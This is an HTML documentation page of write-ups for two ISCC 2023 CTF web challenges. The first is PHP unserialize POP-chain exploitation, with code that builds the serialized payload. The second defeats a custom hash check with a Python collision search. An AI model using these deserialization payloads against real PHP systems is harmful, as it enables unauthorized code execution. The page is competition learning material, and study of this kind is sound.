@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ISCC 2023 &mdash; CTF 0.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            CTF
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Lexington-Informatics-Tournament.html">Lexington Informatics Tournament CTF 2023</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lexington-Informatics-Tournament.html#web">WEB</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">CTF</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">ISCC 2023</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/source/2023/ISCC/README.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="iscc-2023">
+<h1>ISCC 2023<a class="headerlink" href="#iscc-2023" title="Permalink to this heading"></a></h1>
+<section id="web">
+<h2>WEB<a class="headerlink" href="#web" title="Permalink to this heading"></a></h2>
+<section id="web3">
+<h3>web3<a class="headerlink" href="#web3" title="Permalink to this heading"></a></h3>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">?&gt; </span><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">&quot;./xxxiscc.php&quot;</span><span class="p">);</span>
+<span class="k">class</span> <span class="nc">boy</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$like</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">like</span><span class="o">-&gt;</span><span class="na">make_friends</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;拱火大法好&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">like</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">girl</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$boyname</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;我害羞羞&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">boyname</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>  
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">helper</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">string</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__isset</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;僚机上线&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;僚机不懈努力&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$name</span><span class="p">;</span>
+        <span class="nv">$var</span><span class="p">[</span><span class="nv">$name</span><span class="p">]();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">love_story</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">love</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;爱情萌芽&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="nb">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$make</span><span class="p">,</span> <span class="nv">$colo</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="s2">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$make</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;girl_and_boy&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$colo</span> <span class="o">===</span> <span class="s2">&quot;fall_in_love&quot;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;iscc&quot;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$a</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;iscc&#39;</span><span class="p">]);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>经典的PHP反序列化链子，我的思路如下：</p>
+<ol class="arabic simple">
+<li><p>反序列化类销毁自动触发 boy 类的 destruct()，此时会调用 &#64;$this-&gt;like-&gt;make_friends();</p></li>
+</ol>
+<p>将 this-&gt;like 设为 一个 girl 类对象，此时会触发 girl 类的 __call 魔术方法。</p>
+<ol class="arabic simple" start="2">
+<li><p>在 girl 的 __call 魔术方法中会触发 isset($this-&gt;boyname-&gt;name);</p></li>
+</ol>
+<p>若将 this-&gt;boyname 设为 helper 类对象，此时会自动触发 helper 类的 __isset() 魔术方法，在这个方法中会调用 echo $this-&gt;name;</p>
+<p>如果 this-&gt;name 是一个 boy 类对象，那么此时会触发 boy 类的 __toString() 方法</p>
+<ol class="arabic simple" start="3">
+<li><p>在 boy 类的 __toString() 方法中会调用 $this-&gt;like-&gt;string;</p></li>
+</ol>
+<p>如果 this-&gt;like 是一个 helper 类对象，此时会自动触发该类的 __get() 魔术方法</p>
+<p>然后调用的是</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">$var = $this-&gt;$name;</span>
+<span class="x">$var[$name]();</span>
+</pre></div>
+</div>
+<p>$name 传进来是 “string”</p>
+<p>所以相当于调用 $this-&gt;string，若这个值是 love_story 类对象</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">boy</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$like</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">like</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">like</span><span class="o">-&gt;</span><span class="na">make_friends</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;拱火大法好&lt;br&gt;&quot;</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">like</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">girl</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$boyname</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">boyname</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;我害羞羞&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">boyname</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">helper</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">string</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__isset</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;僚机上线&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="k">echo</span> <span class="s2">&quot;僚机不懈努力&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$name</span><span class="p">;</span>
+        <span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+        <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span>
+        <span class="nv">$var</span><span class="p">[</span><span class="nv">$name</span><span class="p">]();</span>
+        <span class="c1">//</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">love_story</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">love</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;爱情萌芽&lt;br&gt;&quot;</span><span class="p">;</span>
+        <span class="c1">//$this = array(&quot;fall_in_love&quot;=&gt;&quot;girl_and_boy&quot;);</span>
+        <span class="c1">#var_dump(&quot;当前的this&quot;.$this);</span>
+        <span class="nb">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$make</span><span class="p">,</span> <span class="nv">$colo</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="s2">&quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$make</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;girl_and_boy&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$colo</span> <span class="o">===</span> <span class="s2">&quot;fall_in_love&quot;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$love_story1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">love_story</span><span class="p">();</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;string&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;phpinfo&quot;</span><span class="p">);</span>
+<span class="nv">$helper2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">helper</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">,</span><span class="nv">$test</span><span class="p">);</span>
+
+<span class="nv">$boy2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">boy</span><span class="p">(</span><span class="nv">$helper2</span><span class="p">);</span>
+
+<span class="nv">$helper1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">helper</span><span class="p">(</span><span class="nv">$boy2</span><span class="p">,</span><span class="nv">$boy2</span><span class="p">);</span>
+
+<span class="nv">$girl1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">girl</span><span class="p">(</span><span class="nv">$helper1</span><span class="p">);</span>
+
+<span class="nv">$boy1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">boy</span><span class="p">(</span><span class="nv">$girl1</span><span class="p">);</span>
+
+
+<span class="nv">$ans</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$boy1</span><span class="p">));</span>
+
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$ans</span><span class="p">);</span>
+</pre></div>
+</div>
+</section>
+<section id="id1">
+<h3>小周的密码锁<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
+<p>传参 password=4&amp;password=5 拿到源码。</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="k">function</span> <span class="nf">MyHashCode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$h</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">intval40</span><span class="p">(</span><span class="nx">intval40</span><span class="p">(</span><span class="mi">40</span> <span class="o">*</span> <span class="nv">$hash</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$hash</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">function</span> <span class="nf">intval40</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$falg</span> <span class="o">=</span> <span class="nv">$code</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$falg</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$code</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="nv">$code</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nv">$code</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$code</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">Checked</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+        <span class="nv">$p1</span> <span class="o">=</span> <span class="s1">&#39;/ISCC/&#39;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$p1</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)){</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">SecurityCheck</span><span class="p">(</span><span class="nv">$sha1</span><span class="p">,</span><span class="nv">$sha2</span><span class="p">,</span><span class="nv">$user</span><span class="p">){</span>
+        
+        <span class="nv">$p1</span> <span class="o">=</span> <span class="s1">&#39;/^[a-z]+$/&#39;</span><span class="p">;</span>
+        <span class="nv">$p2</span> <span class="o">=</span> <span class="s1">&#39;/^[A-Z]+$/&#39;</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$p1</span><span class="p">,</span> <span class="nv">$sha1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$p2</span><span class="p">,</span> <span class="nv">$sha2</span><span class="p">)){</span>
+            <span class="nv">$sha1</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$sha1</span><span class="p">);</span>
+            <span class="nv">$sha2</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$sha2</span><span class="p">);</span>
+            <span class="nv">$user</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+            <span class="nv">$crypto</span> <span class="o">=</span> <span class="nv">$sha1</span> <span class="o">^</span> <span class="nv">$sha2</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;wrong&quot;</span><span class="p">);</span>
+        <span class="p">}</span>       
+
+        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$crypto</span><span class="p">,</span> <span class="nv">$user</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    
+    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span><span class="c1">//user</span>
+    <span class="nv">$sha1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sha1&#39;</span><span class="p">];</span><span class="c1">//sha1</span>
+    <span class="nv">$sha2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;‮⁦//sha2⁩⁦sha2&#39;</span><span class="p">];</span>
+    <span class="c1">//‮⁦see me ⁩⁦can you </span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">5</span><span class="p">){</span>
+            <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="c1">//Try to encrypt</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sha1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$sha2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$user</span><span class="p">)){</span>
+                <span class="p">[</span><span class="nv">$crypto</span><span class="p">,</span> <span class="nv">$user</span><span class="p">]</span> <span class="o">=</span> <span class="nx">SecurityCheck</span><span class="p">(</span><span class="nv">$sha1</span><span class="p">,</span><span class="nv">$sha2</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">((</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$crypto</span><span class="p">),</span><span class="o">-</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="o">===</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$user</span><span class="p">),</span><span class="o">-</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$user</span><span class="p">),</span><span class="o">-</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span> <span class="o">===</span> <span class="s1">&#39;a05c53&#39;</span><span class="p">){</span><span class="c1">//welcome to ISCC</span>
+                    
+                    <span class="k">if</span><span class="p">((</span><span class="nx">MyHashcode</span><span class="p">(</span><span class="s2">&quot;ISCCNOTHARD&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="nx">MyHashcode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span><span class="o">&amp;&amp;</span><span class="nx">Checked</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
+                        <span class="k">include</span><span class="p">(</span><span class="s2">&quot;f1ag.php&quot;</span><span class="p">);</span>
+                        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+                    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                        <span class="k">die</span><span class="p">(</span><span class="s2">&quot;就快解开了!&quot;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    
+                <span class="p">}</span>
+                <span class="k">else</span><span class="p">{</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;真的想不起来密码了吗?&quot;</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">&quot;密钥错误!&quot;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>    
+    <span class="p">}</span>        
+
+    <span class="nb">mt_srand</span><span class="p">((</span><span class="nb">microtime</span><span class="p">()</span> <span class="o">^</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">))</span> <span class="o">%</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mf">1e4</span><span class="p">)</span> <span class="o">+</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mf">1e4</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>拿到 flag 的条件有两个：</p>
+<ol class="arabic simple">
+<li><p>MyHashcode(“ISCCNOTHARD”) === MyHashcode($_GET[‘password’])</p></li>
+<li><p>Checked($_GET[‘password’])</p></li>
+<li><p>(substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)</p></li>
+<li><p>(substr(sha1($user),-6,6)) === ‘a05c53’)</p></li>
+</ol>
+<section id="id2">
+<h4>前两个条件的分析<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h4>
+<p>分析一下 MyHashcode 函数：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">function MyHashCode($str)</span>
+<span class="x">    {</span>
+<span class="x">        $h = 0;</span>
+<span class="x">        $len = strlen($str);</span>
+<span class="x">        for ($i = 0; $i &lt; $len; $i++) {</span>
+<span class="x">            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));</span>
+<span class="x">        }</span>
+<span class="x">        return abs($hash);</span>
+<span class="x">    }</span>
+<span class="x">function intval40($code)</span>
+<span class="x">    {</span>
+<span class="x">        $falg = $code &gt;&gt; 32;</span>
+<span class="x">        if ($falg == 1) {</span>
+<span class="x">            $code = ~($code - 1);                                                                                                                         </span>
+<span class="x">            return $code * -1;</span>
+<span class="x">        } else {</span>
+<span class="x">            return $code;</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</pre></div>
+</div>
+<p>再看看 Checked 函数：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">function Checked($str){</span>
+<span class="x">        $p1 = &#39;/ISCC/&#39;;</span>
+<span class="x">        if (preg_match($p1, $str)){</span>
+<span class="x">            return false;</span>
+<span class="x">        }</span>
+<span class="x">        return true;</span>
+<span class="x">    }</span>
+</pre></div>
+</div>
+<p>为了通过 Checked 函数，传入的 password 不可以以 ISCC 开头，我们试着爆破一下验证码：</p>
+<p>没爆破出来，我只能仔细分析一下相关函数，经过我的分析发现如下几个重要的特点：</p>
+<ol class="arabic simple">
+<li><p>intval40 函数对哈希值不起任何作用，所以在求哈希和的过程中可以直接略去该函数。</p></li>
+<li><p>最后的哈希和可以写成如下形式：</p></li>
+</ol>
+<p>$h_i=40^{i-1}m_0+40^{i-2}m_1+….+40^{1}m_{i-2}+40^{0}m_{i-1}$</p>
+<p>这可以给我们一个启发：</p>
+<p>若我们保持 ISCCNOTHARD 除最高两位不同外其余位都相同，此时若可以找到两个字符 x 和 y，使得</p>
+<p>$40^{10}x+40^{9}y=40^{10}*ord(I)+40^{9}*ord(S)$</p>
+<p>那么我们就成功找到了一组哈希碰撞。下面简单地用 python 脚本试试</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span>sum = 40**10 * ord(&quot;I&quot;) + 40**9 * ord(&quot;S&quot;)
+for x in range(128):
+    for y in range(128):
+        if (40**10 * x + 40**9 * y == sum):
+            print(x,y)
+            print(chr(x),chr(y))
+72 123
+H {
+73 83
+I S
+74 43
+J +
+75 3
+K 
+</pre></div>
+</div>
+<p>验证一下果然为 ture：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">$target = MyHashcode(&quot;ISCCNOTHARD&quot;);</span>
+<span class="x">$test = MyHashCode(&quot;H{CCNOTHARD&quot;);</span>
+<span class="x">var_dump($target == $test); # True</span>
+</pre></div>
+</div>
